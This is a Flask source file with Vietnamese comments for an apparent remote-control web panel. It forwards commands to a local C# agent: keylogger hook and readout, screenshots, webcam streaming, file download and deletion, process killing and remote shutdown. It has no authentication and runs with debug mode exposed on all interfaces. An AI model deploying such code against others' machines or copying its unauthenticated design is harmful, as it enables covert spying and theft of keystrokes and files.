from flask import Flask, render_template, request, jsonify, Response
import socket
import base64

app = Flask(__name__)

# Cấu hình kết nối tới C# Server
HOST = '127.0.0.1'
PORT = 5656
PORT_VID = 5657 # Port nhận video stream từ C#
# Danh sách ánh xạ tên thông dụng sang tên tiến trình thực tế
APP_ALIASES = {
    "edge": "msedge",
    "chrome": "chrome",
    "coc coc": "browser",
    "word": "winword",
    "excel": "excel",
    "powerpoint": "powerpnt",
    "notepad": "notepad",
    "calc": "calc",
    "paint": "mspaint",
    "cmd": "cmd"
}

# Hàm tiện ích nhận đủ n bytes dữ liệu (dùng cho ảnh)
def recvall(sock, n):
    data = b''
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet: return None
        data += packet
    return data

# Hàm trung tâm: Gửi lệnh Socket sang C# Server và xử lý phản hồi
# File: app.py (Cập nhật hàm send_command_to_server)

def send_command_to_server(command_type, sub_command=None, args=None, file_content=None):
    response_data = None
    status = "error"
    msg = ""
    client = None

    try:
        # 1. Kết nối
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.settimeout(10)
        client.connect((HOST, PORT))
        writer = client.makefile('w', encoding='utf-8', newline='\r\n')
        reader = client.makefile('r', encoding='utf-8', newline='\r\n')

        # === 2. XỬ LÝ GỬI LỆNH THEO TỪNG NHÓM (KHÔNG GỬI TỰ ĐỘNG Ở ĐẦU NỮA) ===

        # --- NHÓM LỆNH HỆ THỐNG CƠ BẢN ---
        if command_type in ["PROCESS", "APPLICATION", "KEYLOG", "TAKEPIC", "SHUTDOWN", "RESTART"]:
            writer.write(f"{command_type}\n") # Tự gửi Header
            writer.flush()
            
            # (Giữ nguyên logic xử lý của nhóm này như cũ)
            if command_type == "TAKEPIC":
                client.sendall(b"TAKE\n")
                size_buffer = b""
                while True:
                    char = client.recv(1)
                    if char == b'\n' or not char: break
                    size_buffer += char
                size_str = size_buffer.decode('utf-8').strip()
                if size_str.isdigit() and int(size_str) > 0:
                    img_data = recvall(client, int(size_str))
                    if img_data:
                        response_data = base64.b64encode(img_data).decode('utf-8')
                        status = "success"
                client.sendall(b"QUIT\n")

            elif command_type in ["SHUTDOWN", "RESTART"]:
                status = "success"
                msg = f"Sent {command_type}"

            elif command_type == "KEYLOG":
                if sub_command == "PRINT":
                    writer.write("PRINT\n")
                    writer.flush()
                    response_data = reader.readline().strip()
                    status = "success"
                elif sub_command in ["HOOK", "UNHOOK", "CLEAR", "STATUS"]:
                    writer.write(f"{sub_command}\n")
                    writer.flush()
                    if sub_command == "STATUS": response_data = reader.readline().strip()
                    elif sub_command == "CLEAR": msg = reader.readline().strip()
                    status = "success"
                writer.write("QUIT\n")
                writer.flush()

            elif command_type in ["PROCESS", "APPLICATION"]:
                if sub_command == "XEM":
                    writer.write("XEM\n")
                    writer.flush()
                    try:
                        count_str = reader.readline().strip()
                        if count_str and count_str.isdigit():
                            count = int(count_str)
                            data_list = []
                            for _ in range(count):
                                p_name = reader.readline().strip()
                                p_id = reader.readline().strip()
                                p_threads = reader.readline().strip()
                                data_list.append({"name": p_name, "id": p_id, "threads": p_threads})
                            response_data = data_list
                            status = "success"
                    except: msg = "Lỗi đọc Process"
                elif sub_command in ["KILL", "START"]:
                    writer.write(f"{sub_command}\n")
                    writer.write(f"{sub_command}ID\n")
                    final_args = args
                    if sub_command == "START" and args and args.lower() in APP_ALIASES:
                        final_args = APP_ALIASES[args.lower()]
                    writer.write(f"{final_args}\n")
                    writer.flush()
                    res = reader.readline()
                    status = "success" if "Success" in res else "error"
                    msg = res.strip()
                writer.write("QUIT\n")
                writer.flush()

        # --- NHÓM WEBCAM ---
        elif command_type == "WEBCAM":
            writer.write(f"{sub_command}\n") # Gửi thẳng lệnh con (WEBCAM_START...)
            writer.flush()
            msg = reader.readline().strip()
            status = "success"
            writer.write("QUIT\n")
            writer.flush()

        # --- NHÓM FILE EXPLORER (NÂNG CẤP) ---
        elif command_type == "FILE":
            if sub_command == "GET_FILES":
                writer.write("GET_FILES\n")
                # Gửi đường dẫn (nếu không có thì gửi ROOT)
                path = args if args else "ROOT"
                writer.write(f"{path}\n")
                writer.flush()
                
                count_str = reader.readline().strip()
                if count_str.isdigit():
                    count = int(count_str)
                    file_list = []
                    for _ in range(count):
                        # Đọc format: [TYPE]|NAME|SIZE
                        raw = reader.readline().strip()
                        parts = raw.split('|')
                        if len(parts) >= 3:
                            file_list.append({"type": parts[0], "name": parts[1], "size": parts[2]})
                    response_data = file_list
                    status = "success"
                else: msg = "Lỗi đọc danh sách"

            elif sub_command == "DELETE":
                writer.write("DELETE_FILE\n")
                writer.write(f"{args}\n") # Gửi đường dẫn cần xóa
                writer.flush()
                msg = reader.readline().strip()
                status = "success"

            elif sub_command == "DOWNLOAD":
                writer.write("DOWNLOAD_FILE\n")
                writer.write(f"{args}\n") # Gửi đường dẫn file
                writer.flush()
                
                size_str = reader.readline().strip()
                if size_str.isdigit() and int(size_str) > 0:
                    f_data = recvall(client, int(size_str))
                    if f_data:
                        response_data = base64.b64encode(f_data).decode('utf-8')
                        status = "success"
                    else: msg = "Lỗi tải dữ liệu"
                else: msg = "File không tồn tại hoặc rỗng"

            writer.write("QUIT\n")
            writer.flush()

    except Exception as e:
        msg = f"Lỗi kết nối: {str(e)}"
    finally:
        if client: client.close()

    return {"status": status, "data": response_data, "message": msg}
# --- CÁC API ROUTES (Endpoints cho Frontend gọi) ---

@app.route('/')
def index(): return render_template('index.html')

@app.route('/api/keylog/status')
def get_keylog_status(): 
    return jsonify(send_command_to_server("KEYLOG", "STATUS"))

@app.route('/api/process/list')
def get_processes(): return jsonify(send_command_to_server("PROCESS", "XEM"))

@app.route('/api/process/kill', methods=['POST'])
def kill_process(): return jsonify(send_command_to_server("PROCESS", "KILL", request.json.get('id')))

@app.route('/api/process/start', methods=['POST'])
def start_process(): return jsonify(send_command_to_server("PROCESS", "START", request.json.get('name')))

@app.route('/api/app/list')
def get_apps(): return jsonify(send_command_to_server("APPLICATION", "XEM"))

@app.route('/api/app/kill', methods=['POST'])
def kill_app(): return jsonify(send_command_to_server("APPLICATION", "KILL", request.json.get('id')))

@app.route('/api/screenshot')
def take_screenshot(): return jsonify(send_command_to_server("TAKEPIC"))

@app.route('/api/keylog/get')
def get_keylog(): return jsonify(send_command_to_server("KEYLOG", "PRINT"))

@app.route('/api/keylog/hook', methods=['POST'])
def hook_keylog(): return jsonify(send_command_to_server("KEYLOG", request.json.get('action')))

@app.route('/api/keylog/clear', methods=['POST'])
def clear_keylog(): return jsonify(send_command_to_server("KEYLOG", "CLEAR"))

@app.route('/api/power', methods=['POST'])
def power_action(): return jsonify(send_command_to_server(request.json.get('action')))
# --- CÁC HÀM XỬ LÝ WEBCAM (THÊM MỚI) ---

# 1. Generator: Kết nối tới Port 5657 để lấy luồng video MJPEG
def generate_frames():
    vid_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        vid_socket.connect((HOST, PORT_VID)) # Kết nối Port 5657
        
        while True:
            # Đọc kích thước ảnh (dạng chuỗi kết thúc bằng \n)
            size_buffer = b""
            while True:
                char = vid_socket.recv(1)
                if char == b'\n' or not char: break
                size_buffer += char
            
            size_str = size_buffer.decode('utf-8').strip()
            if not size_str: break
            
            # Đọc dữ liệu ảnh theo kích thước đã biết
            img_size = int(size_str)
            img_data = recvall(vid_socket, img_size)
            
            if img_data:
                # Tạo format MJPEG streaming (Multipart)
                yield (b'--frame\r\n'
                       b'Content-Type: image/jpeg\r\n\r\n' + img_data + b'\r\n')
    except:
        pass
    finally:
        vid_socket.close()

# 2. Route hiển thị video (Gán vào thẻ <img src="...">)
@app.route('/video_feed')
def video_feed():
    return Response(generate_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')

# 3. API điều khiển Webcam (Start/Stop/Record)
@app.route('/api/webcam', methods=['POST'])
def webcam_control():
    # Gửi lệnh sang Port 5656 (như các lệnh khác)
    action = request.json.get('action') 
    return jsonify(send_command_to_server("WEBCAM", action))

# 4. API Quản lý file
@app.route('/api/file', methods=['POST'])
def file_manager():
    data = request.json
    action = data.get('action') # GET_FILES hoặc DOWNLOAD
    filename = data.get('filename') # Chỉ dùng khi DOWNLOAD
    
    return jsonify(send_command_to_server("FILE", action, filename))
if __name__ == '__main__':
    # host='0.0.0.0' cho phép truy cập từ các máy khác trong mạng LAN
    app.run(host='0.0.0.0', debug=True, port=5000)